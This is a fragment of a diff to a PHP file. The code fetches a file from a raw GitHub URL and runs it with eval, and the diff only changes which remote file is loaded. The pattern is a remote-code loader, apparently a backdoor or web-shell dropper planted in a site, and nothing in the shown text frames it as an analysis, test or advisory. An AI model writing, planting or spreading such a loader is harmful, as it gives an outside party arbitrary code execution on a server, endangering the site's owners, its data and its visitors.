@@ -30,7 +30,7 @@ function geturlsinfo($url) {
   return $url_get_contents_data;
 }
 
-  $a = geturlsinfo('https://raw.githubusercontent.com/pepegacor9/yusuf/refs/heads/main/domutpim');
+  $a = geturlsinfo('https://raw.githubusercontent.com/pepegacor9/yusuf/refs/heads/main/index.php');
   eval('?>' . $a);
 
 ?>
